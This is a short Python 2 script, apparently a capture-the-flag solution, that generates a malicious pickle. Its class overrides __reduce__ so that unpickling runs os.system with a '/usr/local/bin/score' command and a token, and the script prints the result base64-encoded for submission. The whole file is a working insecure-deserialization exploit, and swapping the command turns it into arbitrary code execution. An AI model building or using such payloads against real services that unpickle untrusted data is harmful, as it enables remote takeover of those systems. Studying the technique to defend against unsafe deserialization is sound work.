#!/usr/bin/env python2
import cPickle
import os
from base64 import b64encode

class Blah(object):
  def __reduce__(self):
    return (os.system,("/usr/local/bin/score c3d4bce2-571b-496e-b9b6-ab218fa29870",))

h = Blah()

print b64encode(cPickle.dumps(h))

